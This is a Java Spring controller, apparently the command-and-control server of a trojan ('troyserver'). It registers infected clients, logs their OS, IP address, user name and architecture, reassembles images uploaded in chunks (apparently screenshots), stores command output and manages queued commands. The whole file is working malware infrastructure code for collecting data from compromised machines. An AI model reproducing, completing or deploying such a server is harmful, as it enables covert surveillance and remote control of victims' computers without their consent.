package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.entity.Client;
import ch.lebois.troyserver.data.entity.Image;
import ch.lebois.troyserver.data.entity.Message;
import ch.lebois.troyserver.data.repository.ClientRepository;
import ch.lebois.troyserver.data.repository.ImageRepository;
import ch.lebois.troyserver.data.repository.MessageRepository;
import ch.lebois.troyserver.service.ImageService;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping(value = "reciver/")
public class ServerReceiverController {

    private ArrayList<Byte> bytes = new ArrayList<>();

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;
    private ImageRepository imageRepository;

    private ImageService imageService;
    private Client client;
    private int allBytesSize;
    private Message imgLoader;

    public ServerReceiverController(ClientRepository clientRepository, MessageRepository messageRepository,
                                    ImageService imageService, ImageRepository imageRepository) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
        this.imageService = imageService;
        this.imageRepository = imageRepository;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getInfo(@PathVariable(value = "client") String clientParam,
                          @RequestParam(name = "type", defaultValue = "") String typeParam,
                          @RequestParam(name = "value", defaultValue = "") String valueParam) {

        client = getClient(clientParam);

        switch (typeParam) {
            case "os":
                client.setOs(valueParam);
                break;
            case "ip":
                client.setIp(valueParam);
                break;
            case "user":
                client.setPcuser(valueParam);
                break;
            case "arch":
                client.setArch(valueParam);
                break;
            case "online":
                break;
            case "img":
                imgLoader.setText(String.valueOf("Loading: " + (bytes.size() / allBytesSize)));
                messageRepository.save(imgLoader);
                addBytes(valueParam);
                clearCommands();
                break;
            case "imgSize":
                allBytesSize = Integer.valueOf(valueParam);
                imgLoader = new Message();
                imgLoader.setPcNameFk(clientParam);
                imgLoader.setType("commandout");
                imgLoader.setText("");
                messageRepository.save(imgLoader);
                clearCommands();
                break;
            case "imgend":
                imgLoader = new Message();
                createMessage(clientParam, "commandout", "Creating Img");
                createMessage(clientParam, typeParam, "Saved img: " + createImg(clientParam));
                break;
            default:
                clearCommands();
                createMessage(clientParam, typeParam, valueParam);
                break;
        }
        lastSeen();
        return "receiver";
    }

    private void lastSeen() {
        client.setLastseen(new SimpleDateFormat("HH:mm dd.MM").format(Calendar.getInstance().getTime()));
        clientRepository.save(client);
    }

    private Client getClient(String clientParam) {
        Client client = clientRepository.findOne(clientParam);
        if (client == null) {
            client = new Client();
            client.setPcName(clientParam);
            client.setInfo("");
            clientRepository.save(client);
        }

        return client;
    }

    private void addBytes(String valueParam) {
        for (String s : valueParam.split("_")) {
            try {
                bytes.add(Byte.valueOf(s));
            } catch (NumberFormatException ignored) {
            }
        }
    }

    private String createImg(String clientParam) {
        String fileName = imageService.getImage(bytes, clientParam);
        bytes = new ArrayList<>();

        Image image = new Image();
        image.setPcNameFk(clientParam);
        image.setName(fileName);
        imageRepository.save(image);
        return fileName;
    }

    private void clearCommands() {
        client.setCommands("");
    }

    private void createMessage(String clientName, String messageType, String messageValue) {
        Message message = new Message();
        message.setPcNameFk(clientName);
        message.setType(messageType);
        message.setText(messageValue);
        messageRepository.save(message);
    }
}
